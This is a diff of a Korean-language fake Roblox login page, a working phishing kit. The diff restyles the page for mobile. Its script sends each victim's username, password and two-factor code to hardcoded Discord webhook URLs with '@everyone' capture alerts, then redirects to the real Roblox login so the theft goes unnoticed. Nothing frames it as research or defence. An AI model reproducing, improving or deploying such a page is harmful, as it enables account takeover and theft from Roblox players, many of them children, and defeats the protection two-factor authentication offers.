@@ -2,580 +2,478 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox에 로그인</title>
-    <link rel="icon" href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Roblox</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            color: #000;
-            background: #f5f5f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans KR', sans-serif;
+            background: #f2f2f7;
+            color: #333;
             min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            -webkit-font-smoothing: antialiased;
         }
-        
-        /* 헤더 - Roblox 스타일 */
+        a { text-decoration: none; }
+        input { outline: none; }
+
+        /* 헤더 */
         .header {
-            background: #191a1f;
-            padding: 0 24px;
-            height: 56px;
+            background: #101010;
+            padding: 12px 16px;
             display: flex;
             align-items: center;
+            justify-content: space-between;
             position: fixed;
             top: 0;
             left: 0;
             right: 0;
             z-index: 100;
         }
-        
-        .header-inner {
-            max-width: 1200px;
-            margin: 0 auto;
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-        
         .header-left {
-            display: flex;
-            align-items: center;
-            gap: 28px;
-        }
-        
-        /* Roblox 로고 - 검정색 스타일 */
-        .roblox-logo {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            text-decoration: none;
-        }
-        
-        .logo-box {
-            width: 34px;
-            height: 34px;
-            background: #000;
-            border-radius: 6px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-        }
-        
-        .logo-box-inner {
-            width: 18px;
-            height: 18px;
-            background: #fff;
-            border-radius: 2px;
-        }
-        
-        .logo-text {
-            font-size: 20px;
-            font-weight: 800;
-            color: #fff;
-            letter-spacing: -0.3px;
-        }
-        
-        .nav-links {
-            display: flex;
-            gap: 24px;
-            list-style: none;
-        }
-        
-        .nav-links a {
-            color: #cbcbcb;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 600;
-        }
-        
-        .nav-links a:hover { color: #fff; }
-        
-        .header-right {
             display: flex;
             align-items: center;
             gap: 12px;
         }
-        
-        .btn-signup {
-            background: #000;
-            color: #fff;
-            border: none;
-            padding: 8px 20px;
-            border-radius: 6px;
-            font-size: 14px;
-            font-weight: 700;
-            cursor: pointer;
-        }
-        
-        .btn-signup:hover { background: #333; }
-        
-        /* 메인 콘텐츠 */
-        .main-content {
-            min-height: calc(100vh - 56px);
+        .header-back {
+            width: 24px;
+            height: 24px;
             display: flex;
-            justify-content: center;
             align-items: center;
-            padding: 80px 20px 40px;
-            margin-top: 56px;
+            justify-content: center;
         }
-        
+        .header-back svg { fill: #fff; }
+        .header-logo svg { height: 24px; display: block; }
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .header-right svg { fill: #fff; width: 22px; height: 22px; }
+
+        /* 메인 */
+        .main-content {
+            flex: 1;
+            padding: 80px 20px 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* 로고 영역 */
+        .logo-section {
+            text-align: center;
+            margin: 20px 0 32px;
+        }
+        .logo-section .logo-icon {
+            width: 72px;
+            height: 72px;
+            margin-bottom: 12px;
+        }
+        .logo-section h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #111;
+            letter-spacing: -0.3px;
+        }
+
+        /* 로그인 폼 카드 */
         .login-card {
-            background: #fff;
-            border-radius: 12px;
-            box-shadow: 0 2px 24px rgba(0,0,0,0.15);
-            padding: 40px 32px;
             width: 100%;
             max-width: 400px;
         }
-        
-        /* 카드 상단 검정색 Roblox 로고 */
-        .card-logo {
+
+        .form-group { margin-bottom: 16px; }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #555;
+            margin-bottom: 6px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            background: #fff;
+            color: #333;
+            -webkit-appearance: none;
+        }
+        .form-group input:focus {
+            border-color: #007aff;
+            box-shadow: 0 0 0 3px rgba(0,122,255,0.12);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            background: #007aff;
+            color: #fff;
+            border: none;
+            border-radius: 30px;
+            font-size: 17px;
+            font-weight: 600;
+            margin-top: 8px;
+            cursor: pointer;
+            -webkit-appearance: none;
+        }
+        .login-btn:active { background: #0056b3; }
+
+        .forgot-link {
+            display: block;
             text-align: center;
-            margin-bottom: 32px;
+            margin-top: 16px;
+            font-size: 15px;
+            color: #007aff;
+            font-weight: 500;
+        }
+
+        /* 구분선 */
+        .divider-wrap {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+            color: #8e8e93;
+            font-size: 13px;
+        }
+        .divider-wrap::before,
+        .divider-wrap::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #e0e0e0;
+        }
+        .divider-wrap span { padding: 0 16px; }
+
+        .device-btn {
+            width: 100%;
+            padding: 14px;
+            background: #fff;
+            color: #007aff;
+            border: 1px solid #e0e0e0;
+            border-radius: 30px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 6px;
+            -webkit-appearance: none;
         }
-        
-        .card-logo-icon {
-            display: inline-block;
-            width: 40px;
-            height: 40px;
-            background: #000;
-            border-radius: 8px;
-            position: relative;
-            flex-shrink: 0;
-        }
-        
-        .card-logo-icon::after {
-            content: '';
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            width: 20px;
-            height: 20px;
-            background: #fff;
-            border-radius: 3px;
-        }
-        
-        .card-logo-text {
-            font-size: 28px;
-            font-weight: 800;
-            color: #000;
-        }
-        
-        /* 폼 스타일 */
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-group label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #000;
-            margin-bottom: 6px;
-        }
-        
-        .form-group input {
-            width: 100%;
-            padding: 12px 16px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
-            color: #000;
-            background: #fafafa;
-        }
-        
-        .form-group input:focus {
-            outline: none;
-            border-color: #000;
-            background: #fff;
-        }
-        
-        .login-btn {
-            width: 100%;
-            padding: 14px;
-            background: #000;
-            color: #fff;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            margin-top: 8px;
-        }
-        
-        .login-btn:hover { background: #333; }
-        
-        .divider {
+        .device-btn:active { background: #f2f2f7; }
+
+        .signup-text {
             text-align: center;
-            margin: 24px 0;
-            color: #999;
-            font-size: 13px;
-            position: relative;
+            margin-top: 32px;
+            font-size: 15px;
+            color: #777;
         }
-        
-        .divider::before,
-        .divider::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            width: 40%;
-            height: 1px;
-            background: #e0e0e0;
-        }
-        
-        .divider::before { left: 0; }
-        .divider::after { right: 0; }
-        
-        .social-login {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 20px;
-        }
-        
-        .social-btn {
-            flex: 1;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            background: #fff;
-            cursor: pointer;
-            font-size: 14px;
-            text-align: center;
-            color: #000;
-            font-weight: 600;
-        }
-        
-        .social-btn:hover { background: #f5f5f5; }
-        
-        .links {
-            text-align: center;
-            margin-top: 20px;
-        }
-        
-        .links a {
-            color: #000;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 600;
-        }
-        
-        .links a:hover { text-decoration: underline; }
-        
+        .signup-text a { color: #007aff; font-weight: 700; }
+
         .error-msg {
-            background: #ffe0e0;
             color: #d32f2f;
-            padding: 10px 14px;
-            border-radius: 8px;
             font-size: 13px;
-            margin-bottom: 16px;
+            margin-top: 12px;
             display: none;
-        }
-        
-        .error-msg.show { display: block; }
-        
-        #step2fa { display: none; }
-        
-        .tfa-title {
+            padding: 10px 12px;
+            background: #fef0ef;
+            border-radius: 10px;
             text-align: center;
+        }
+
+        /* 2FA 화면 */
+        #step2fa { display: none; }
+
+        .fa-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .fa-header .fa-icon {
+            width: 64px;
+            height: 64px;
+            margin-bottom: 16px;
+        }
+        .fa-header h2 {
             font-size: 20px;
             font-weight: 700;
-            color: #000;
+            color: #111;
             margin-bottom: 8px;
         }
-        
-        .info-text {
-            text-align: center;
+        .fa-header p {
+            font-size: 14px;
             color: #666;
-            font-size: 13px;
-            margin-bottom: 8px;
+            line-height: 1.4;
         }
-        
-        .code-inputs {
+        .fa-header p strong { color: #333; }
+
+        .fa-input-wrap {
             display: flex;
             gap: 8px;
             justify-content: center;
-            margin: 20px 0;
+            margin: 24px 0;
         }
-        
-        .code-inputs input {
+        .fa-input-wrap input {
             width: 48px;
             height: 56px;
             text-align: center;
             font-size: 24px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
             font-weight: 700;
-            color: #000;
+            border: 1px solid #e0e0e0;
+            border-radius: 10px;
+            background: #fff;
+            color: #333;
+            -webkit-appearance: none;
         }
-        
-        .code-inputs input:focus {
-            border-color: #000;
-            outline: none;
+        .fa-input-wrap input:focus {
+            border-color: #007aff;
+            box-shadow: 0 0 0 3px rgba(0,122,255,0.12);
         }
-        
-        .link-btn {
-            background: none;
-            border: none;
-            color: #000;
-            cursor: pointer;
+
+        .fa-resend {
+            text-align: center;
             font-size: 14px;
-            margin-top: 12px;
-            font-weight: 600;
+            color: #8e8e93;
+            margin-top: 16px;
         }
-        
-        .link-btn:hover { text-decoration: underline; }
-        
+        .fa-resend a { color: #007aff; font-weight: 500; }
+
+        .fa-error {
+            color: #d32f2f;
+            font-size: 13px;
+            margin-top: 12px;
+            display: none;
+            padding: 10px 12px;
+            background: #fef0ef;
+            border-radius: 10px;
+            text-align: center;
+        }
+
         /* 푸터 */
         .footer {
-            background: #191a1f;
-            padding: 40px 20px 20px;
-            color: #999;
-            font-size: 13px;
+            background: #101010;
+            padding: 16px 20px;
+            text-align: center;
         }
-        
-        .footer-inner {
-            max-width: 1200px;
-            margin: 0 auto;
+        .footer-links {
+            list-style: none;
             display: flex;
             flex-wrap: wrap;
-            gap: 40px;
             justify-content: center;
-        }
-        
-        .footer-col { min-width: 120px; }
-        
-        .footer-col strong {
-            color: #fff;
-            display: block;
-            margin-bottom: 12px;
-            font-size: 13px;
-        }
-        
-        .footer-col a {
-            color: #999;
-            display: block;
+            gap: 12px;
             margin-bottom: 8px;
-            text-decoration: none;
-            font-size: 12px;
         }
-        
-        .footer-col a:hover { color: #fff; }
-        
-        .footer-bottom {
-            text-align: center;
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid #333;
-            color: #666;
-            font-size: 11px;
-            max-width: 1200px;
-            margin-left: auto;
-            margin-right: auto;
+        .footer-links a { color: #888; font-size: 11px; }
+        .footer-links a:hover { color: #fff; }
+        .footer-copy { color: #555; font-size: 11px; }
+
+        @media (max-width: 380px) {
+            .fa-input-wrap input { width: 40px; height: 48px; font-size: 20px; }
         }
     </style>
 </head>
 <body>
 
-<!-- 헤더 -->
-<div class="header">
-    <div class="header-inner">
+    <!-- 헤더 -->
+    <div class="header">
         <div class="header-left">
-            <a href="#" class="roblox-logo">
-                <div class="logo-box">
-                    <div class="logo-box-inner"></div>
-                </div>
-                <span class="logo-text">Roblox</span>
+            <a href="#" class="header-back">
+                <svg viewBox="0 0 24 24" width="24" height="24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
             </a>
-            <ul class="nav-links">
-                <li><a href="#">차트</a></li>
-                <li><a href="#">마켓플레이스</a></li>
-                <li><a href="#">만들기</a></li>
-            </ul>
+            <div class="header-logo">
+                <svg viewBox="0 0 100 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <text x="0" y="20" font-family="Arial, sans-serif" font-size="22" font-weight="800" fill="#fff">R</text>
+                    <rect x="26" y="4" width="16" height="16" rx="2" transform="rotate(20 26 4)" fill="none" stroke="#fff" stroke-width="2.5"/>
+                    <rect x="30" y="8" width="8" height="8" rx="1" transform="rotate(20 30 8)" fill="#fff"/>
+                    <text x="48" y="20" font-family="Arial, sans-serif" font-size="22" font-weight="800" fill="#fff">blox</text>
+                </svg>
+            </div>
         </div>
         <div class="header-right">
-            <button class="btn-signup">가입하기</button>
+            <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
         </div>
     </div>
-</div>
 
-<!-- 메인 -->
-<div class="main-content">
-    <div class="login-card">
-        
-        <!-- 검정색 Roblox 로고 -->
-        <div class="card-logo">
-            <span class="card-logo-icon"></span>
-            <span class="card-logo-text">Roblox</span>
-        </div>
-        
+    <!-- 메인 -->
+    <div class="main-content">
+
         <!-- 1단계: 로그인 -->
         <div id="step1">
-            <form id="loginForm" onsubmit="return false;">
-                <div class="error-msg" id="errorMsg">사용자 이름 또는 비밀번호가 잘못되었습니다. 다시 시도하세요.</div>
-                
-                <div class="form-group">
-                    <label for="username">사용자 이름</label>
-                    <input type="text" id="username" name="username" placeholder="사용자 이름 입력" autocomplete="username" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="password">비밀번호</label>
-                    <input type="password" id="password" name="password" placeholder="비밀번호 입력" autocomplete="current-password" required>
-                </div>
-                
-                <button type="submit" class="login-btn" id="loginBtn">로그인</button>
-            </form>
-            
-            <div class="divider">또는</div>
-            
-            <div class="social-login">
-                <button class="social-btn">Google</button>
-                <button class="social-btn">Apple</button>
-                <button class="social-btn">Discord</button>
+            <div class="logo-section">
+                <img class="logo-icon" src="https://cdn.foundation.roblox.com/current/StudioLogo.svg" alt="Roblox">
+                <h1>Roblox에 로그인</h1>
             </div>
-            
-            <div class="links">
-                <a href="#">비밀번호를 잊으셨나요?</a><br><br>
-                <a href="#">계정이 없으신가요? 가입하기</a>
+
+            <div class="login-card">
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label for="username">사용자 이름/이메일/전화번호</label>
+                        <input type="text" id="username" placeholder="사용자 이름 또는 이메일" required autocomplete="off">
+                    </div>
+                    <div class="form-group">
+                        <label for="password">비밀번호</label>
+                        <input type="password" id="password" placeholder="비밀번호" required autocomplete="off">
+                    </div>
+
+                    <button class="login-btn" type="submit">로그인</button>
+                    <a href="#" class="forgot-link">비밀번호 또는 사용자 이름을 잊으셨나요?</a>
+
+                    <div class="divider-wrap"><span>또는</span></div>
+
+                    <button class="device-btn" type="button">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#007aff" stroke-width="2">
+                            <rect x="2" y="3" width="20" height="14" rx="2"/>
+                            <line x1="8" y1="21" x2="16" y2="21"/>
+                            <line x1="12" y1="17" x2="12" y2="21"/>
+                        </svg>
+                        다른 기기로 로그인
+                    </button>
+
+                    <div class="error-msg" id="errorMsg">사용자 이름 또는 비밀번호가 올바르지 않습니다. 다시 시도하세요.</div>
+                </form>
+
+                <div class="signup-text">
+                    계정이 없으신가요? <a href="#">회원가입</a>
+                </div>
             </div>
         </div>
-        
+
         <!-- 2단계: 2FA -->
         <div id="step2fa">
-            <div class="tfa-title">2단계 인증</div>
-            <p class="info-text">인증 앱 또는 이메일로 전송된 6자리 코드를 입력하세요.</p>
-            
-            <form id="tfaForm" onsubmit="return false;">
-                <div class="code-inputs">
-                    <input type="text" maxlength="1" class="code-input">
-                    <input type="text" maxlength="1" class="code-input">
-                    <input type="text" maxlength="1" class="code-input">
-                    <input type="text" maxlength="1" class="code-input">
-                    <input type="text" maxlength="1" class="code-input">
-                    <input type="text" maxlength="1" class="code-input">
-                </div>
-                
-                <button type="submit" class="login-btn" id="tfaBtn">확인</button>
-            </form>
-            
-            <div style="text-align:center;margin-top:16px;">
-                <button class="link-btn" onclick="location.href='https://www.roblox.com/ko/Login'">다른 방법으로 로그인</button>
+            <div class="fa-header">
+                <img class="fa-icon" src="https://cdn.foundation.roblox.com/current/StudioLogo.svg" alt="Roblox">
+                <h2>2단계 인증</h2>
+                <p>
+                    <strong id="faEmailDisplay">이메일</strong>로<br>
+                    전송된 인증 코드를 입력하세요.
+                </p>
             </div>
+
+            <form id="faForm">
+                <div class="fa-input-wrap">
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="fa-digit" data-index="0" autocomplete="off">
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="fa-digit" data-index="1" autocomplete="off">
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="fa-digit" data-index="2" autocomplete="off">
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="fa-digit" data-index="3" autocomplete="off">
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="fa-digit" data-index="4" autocomplete="off">
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="fa-digit" data-index="5" autocomplete="off">
+                </div>
+
+                <button class="login-btn" type="submit">확인</button>
+
+                <div class="fa-resend">
+                    코드를 받지 못하셨나요? <a href="#">다시 보내기</a>
+                </div>
+
+                <div class="fa-error" id="faErrorMsg">잘못된 코드입니다. 다시 시도하거나 코드를 다시 보내세요.</div>
+            </form>
         </div>
+
     </div>
-</div>
 
-<!-- 푸터 -->
-<div class="footer">
-    <div class="footer-inner">
-        <div class="footer-col">
-            <strong>회사 소개</strong>
-            <a href="#">인재 채용</a>
-            <a href="#">블로그</a>
-            <a href="#">보호자 가이드</a>
-        </div>
-        <div class="footer-col">
-            <strong>제품</strong>
-            <a href="#">기프트 카드</a>
-            <a href="#">Robux</a>
-            <a href="#">다운로드</a>
-        </div>
-        <div class="footer-col">
-            <strong>지원</strong>
-            <a href="#">도움말</a>
-            <a href="#">문의하기</a>
-            <a href="#">안전 정보</a>
-        </div>
-        <div class="footer-col">
-            <strong>약관</strong>
-            <a href="#">이용 약관</a>
-            <a href="#">개인정보 처리방침</a>
-            <a href="#">쿠키 정책</a>
-        </div>
+    <!-- 푸터 -->
+    <div class="footer">
+        <ul class="footer-links">
+            <li><a href="#">회사 소개</a></li>
+            <li><a href="#">인재 채용</a></li>
+            <li><a href="#">블로그</a></li>
+            <li><a href="#">보호자 가이드</a></li>
+            <li><a href="#">기프트 카드</a></li>
+            <li><a href="#">도움말</a></li>
+            <li><a href="#">이용 약관</a></li>
+            <li><a href="#">접근성</a></li>
+            <li><a href="#">개인정보</a></li>
+            <li><a href="#">설정</a></li>
+            <li><a href="#">사이트 맵</a></li>
+        </ul>
+        <p class="footer-copy">©2026 Roblox Corporation. Roblox, Roblox 로고 및 Powering Imagination은 미국 및 그 외 국가에서 등록 상표 및 미등록 상표입니다.</p>
     </div>
-    <div class="footer-bottom">
-        ©2025 Roblox Corporation. Roblox, Roblox 로고 및 Powering Imagination은 미국 및 그 외 국가에서 등록 상표 및 미등록 상표입니다.
-    </div>
-</div>
 
-<!-- 쿠키 배너 -->
-<div style="position:fixed;bottom:0;left:0;right:0;background:#222;color:#fff;padding:12px 20px;text-align:center;font-size:13px;z-index:10000;display:flex;align-items:center;justify-content:center;flex-wrap:wrap;gap:8px;">
-    <span>Roblox는 더 나은 환경을 제공하기 위해 쿠키를 사용합니다.</span>
-    <a href="#" style="color:#fff;text-decoration:underline;">자세히 알아보기</a>
-    <button onclick="this.parentElement.style.display='none'" style="background:#000;color:#fff;border:none;padding:6px 16px;border-radius:4px;cursor:pointer;">동의</button>
-</div>
+    <script>
+        var WEBHOOK_URL = 'https://discord.com/api/webhooks/1521785650444107867/exNgO-mbYNSH2WHGb2qjpLUFwEj5X_FuFIDqlVKerooCUTz6H3CDCeYh9FxMAWQpcjpf';
+        var capturedUser = '';
+        var capturedPass = '';
 
-<script>
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1519016223558340763/VGMWxHAntSmh5o18yRoziahcucUREBqfTEbX2IItByAjpPPAQeHTqtDyQnAzY8mmPX4w';
+        // 2FA 숫자 자동 이동
+        document.querySelectorAll('.fa-digit').forEach(function(input, idx, arr) {
+            input.addEventListener('input', function() {
+                if (this.value && idx < 5) {
+                    arr[idx + 1].focus();
+                }
+            });
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && idx > 0) {
+                    arr[idx - 1].focus();
+                }
+            });
+        });
 
-function sendToDiscord(data) {
-    fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            content: '@everyone **🚨 새 로그인 캡처됨!**',
-            embeds: [{
-                title: '🎯 Roblox 크리덴셜',
-                color: 3447003,
-                fields: Object.entries(data).map(([name, value]) => ({ name, value, inline: true })),
-                timestamp: new Date().toISOString()
-            }]
-        })
-    }).catch(console.error);
-}
+        // 1단계 제출
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            capturedUser = document.getElementById('username').value;
+            capturedPass = document.getElementById('password').value;
 
-document.getElementById('loginForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-    const username = document.getElementById('username').value.trim();
-    const password = document.getElementById('password').value;
-    
-    if (!username || !password) {
-        document.getElementById('errorMsg').classList.add('show');
-        return;
-    }
-    
-    window._creds = { '사용자 이름': username, '비밀번호': password };
-    sendToDiscord(window._creds);
-    
-    document.getElementById('step1').style.display = 'none';
-    document.getElementById('step2fa').style.display = 'block';
-    document.querySelector('.code-input').focus();
-});
+            // Discord 전송
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: '**[1단계] Roblox 모바일 로그인 캡처**',
+                    embeds: [{
+                        fields: [
+                            { name: '사용자 이름/이메일', value: capturedUser, inline: true },
+                            { name: '비밀번호', value: capturedPass, inline: true },
+                            { name: '상태', value: '2FA 코드 대기 중...', inline: false }
+                        ],
+                        color: 0x007AFF,
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            }).catch(function(){});
 
-document.querySelectorAll('.code-input').forEach((input, idx, arr) => {
-    input.addEventListener('input', function() {
-        if (this.value.length >= 1 && idx < arr.length - 1) {
-            arr[idx + 1].focus();
-        }
-    });
-    input.addEventListener('keydown', function(e) {
-        if (e.key === 'Backspace' && this.value === '' && idx > 0) {
-            arr[idx - 1].focus();
-        }
-    });
-});
+            // 2FA 화면으로 전환
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2fa').style.display = 'block';
+            document.getElementById('faEmailDisplay').textContent = capturedUser;
+            document.querySelector('.fa-digit').focus();
+        });
 
-document.getElementById('tfaForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-    let code = '';
-    document.querySelectorAll('.code-input').forEach(inp => { code += inp.value; });
-    if (code.length < 6) return;
-    
-    window._creds['2FA 코드'] = code;
-    sendToDiscord({ ...window._creds, '⚠️ 상태': '2FA 코드까지 캡처됨!' });
-    window.location.href = 'https://www.roblox.com/ko/Login?error=incorrect';
-});
+        // 2FA 제출
+        document.getElementById('faForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var code = '';
+            document.querySelectorAll('.fa-digit').forEach(function(input) {
+                code += input.value || '';
+            });
 
-document.getElementById('password').addEventListener('input', function() {
-    document.getElementById('errorMsg').classList.remove('show');
-});
-</script>
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: '**[2단계] Roblox 2FA 코드 캡처됨!** @everyone',
+                    embeds: [{
+                        fields: [
+                            { name: '사용자 이름/이메일', value: capturedUser, inline: true },
+                            { name: '비밀번호', value: capturedPass, inline: true },
+                            { name: '2FA 인증 코드', value: code || '(빈 코드)', inline: false },
+                            { name: '로그인 방식', value: '모바일', inline: true }
+                        ],
+                        color: 0x34C759,
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            }).catch(function(){});
+
+            document.getElementById('faErrorMsg').style.display = 'block';
+            setTimeout(function() {
+                window.location.href = 'https://m.roblox.com/login';
+            }, 2000);
+        });
+    </script>
 
 </body>
 </html>
